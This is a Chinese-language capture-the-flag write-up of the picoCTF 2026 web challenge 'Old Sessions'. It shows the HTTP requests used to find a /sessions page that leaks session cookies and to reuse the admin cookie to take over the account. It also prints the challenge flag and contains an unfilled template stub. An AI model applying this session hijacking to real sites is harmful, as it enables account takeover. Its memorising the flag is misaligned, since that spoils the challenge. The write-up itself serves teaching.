# Web Exploitation / Easy：Old Sessions

- 作者：David Gaviria
- 来源：picoCTF 2026

### 题目内容

#### 题目描述

正确的会话超时控制对保护用户账户至关重要。如果用户在公共或共享电脑上登录，却没有明确登出（只是关闭浏览器标签页），并且会话过期时间配置错误，会话可能会无限期保持活跃。

这样一来，之后使用同一浏览器的攻击者无需凭证即可访问该用户账户，利用的正是会话永不过期且始终保持已认证状态这一点。

你的朋友让你看看他几年前搭建的一个新社交媒体平台。虽然仍在开发中，但他说网站已接近完成。他还提到自己讨厌不断登录网站，所以把页面做成了“一旦登录，就永远不必再登出”！

## 侦察

访问首页
- 响应
    ```http
    HTTP/1.1 302 FOUND
    Server: Werkzeug/3.1.5 Python/3.12.4
    Location: /login
    Set-Cookie: session=IPClnCCd7HQ4C10QkPmPcqPJLysmmaIut97DbHztxGc; 
    ```

- 追踪重定向 `/login`，响应
    ```http
    Set-Cookie: session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Max-Age=0; Path=/

    ...
    <div class="button-group">
        <input type="submit" value="Login" class="primary-button">
        <a href="/register" class="alt-action-button">Register</a>
    </div>
    ```
    - 元素
        - 登录的用户名与密码表单
        - 注册按钮

- 查看注册端点 `/register`，响应
    - 元素
        - 表单：用户名、密码、确认密码
        - 按钮：登录页面


## 功能探测

访问`端点c`，响应
- 响应内容
    - 分析

使用注册功能
- 请求
    ```http
    POST /register HTTP/1.1

    username=foo&password=bar&conf_password=bar
    ```
使用注册账户登录
- 请求
    ```http
    POST /login HTTP/1.1

    username=foo&password=bar
    ```
- 响应 302 重定向并设置 cookie

携带会话 cookie 访问主页
- 响应
    ```http
    Set-Cookie: session=Ewl9mmGtB4ylHK5RizFAam8Yb4FexoYcIQC9GyyxGAQ; 

    <h3 class="welcome-message">Welcome <em>foo</em></h3>
    <a href="/logout" class="logout-button">Logout</a>

    <li class="comment">
        <div class="comment-header">
            <span class="username">mary_jones_8992</span>
            <span class="timestamp">2024-2-20 14:50</span>
        </div>
        <div class="comment-text">
            Hey I found a strange page at /sessions
        </div>
    </li>
    ```
    - 回显用户名名
    - 新端点 `/logout`
    - 用户评论元素
        - 用户名
        - 时间戳
        - 评论内容
    - 特异用户评论，端点 `/sessions`

携带凭据访问可能有趣的端点 `/sessions`
- 请求
    ```http
    GET /sessions HTTP/1.1
    Cookie: session=Ewl9mmGtB4ylHK5RizFAam8Yb4FexoYcIQC9GyyxGAQ
    ```
- 响应
    ```html
    <p>1) session:kaq4qVGnPnXL2X-NoxWQJDffIc2xO778Pj3sA0VwfWE, {'_permanent': True, 'key': 'admin'}</p>
    <p>2) session:Ewl9mmGtB4ylHK5RizFAam8Yb4FexoYcIQC9GyyxGAQ, {'_permanent': True, 'key': 'foo'}</p>
    ```
    - 端点包含用户会话 cookie 列表，其中的管理员 cookie 或有趣

- 移除会话 cookie 后，无法访问会话端点

设置获取的管理员 cookie 访问首页
- 请求
    ```http
    GET / HTTP/1.1
    Cookie: session=kaq4qVGnPnXL2X-NoxWQJDffIc2xO778Pj3sA0VwfWE
    ```

- 响应
    ```html
    <p class="flag-message">
        picoCTF{s3t_s3ss10n_3xp1rat10n5_53a328ed}
    </p>
    ```
